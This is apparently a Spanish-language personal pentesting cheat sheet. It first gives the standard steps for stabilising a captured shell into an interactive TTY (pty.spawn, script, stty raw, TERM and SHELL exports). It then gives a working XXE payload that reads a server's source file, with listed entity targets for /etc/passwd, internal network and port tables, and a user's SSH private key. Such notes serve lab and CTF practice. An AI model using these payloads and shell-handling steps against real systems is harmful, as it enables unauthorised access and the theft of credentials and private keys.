# Diferentes codigos

## Tratamiento de la pseudo-consola
```bash
❯ python3 -c ‘import pty;pty.spawn(“/bin/bash”)’         # Para remplazar el comando de 'Script' por si no lo acepta la consola

❯ Script /dev/null -c bash
❯ Ctrl + z
❯ stty raw -echo; fg
❯ reset xterm

# Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
❯ echo $SHELL                                            # Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
❯ export SHELL=bash o ❯ export SHELL=/bin/bash           # Hacemos que shell ahora valga bash
❯ export TERM=xterm                                      # Para poder hacer Ctrl +c y Ctrl + l (l=ele)

# Ahora para modificar las dimensiones de Vim/nano debemos hacer lo siguiente.
❯ stty size                                              # Miramos las dimensiones de la consola
❯ stty rows 51 columns 189                               # Modificamos las dimensiones de la consola Vim/Nano
```

## XXE
Procedemos a crear un archivo asi:
❯ **vi file.xml** 
	❮?xml version=”1.0” encoding=”ISO-8859-1”?❯
		❮!DOCTYPE foo \[
		❮!ELEMENT foo ANY❯
	❮!ENTITY xxe SYSTEM “file:////opt/blog/server.js”❯]❯
	❮post❯
		❮title❯This is a test❮/title❯
		❮description❯Mensaje de prueba❮/description❯
		❮markdown❯&xxe;❮/markdown❯
	❮/post❯

Comandos que podemos meter en SYSTEM: 
**\file:///proc/net/fib_trie** Que nos muestra las direcciones IP que se encuetran ahi en la maquina 
**\file:///proc/net/tcp** Que nos muestra los puerto abiertos pero de manera interna, miramos que vienen en fomato hexadecimal y podemos desconvertirlos en alguna pagina web.
**\file:////etc/passwd** Ver los usuarios de la maquina 
**\file:///home/admin/.ssh/id_rsa** Tratar de listar la id_rsa de la maquina
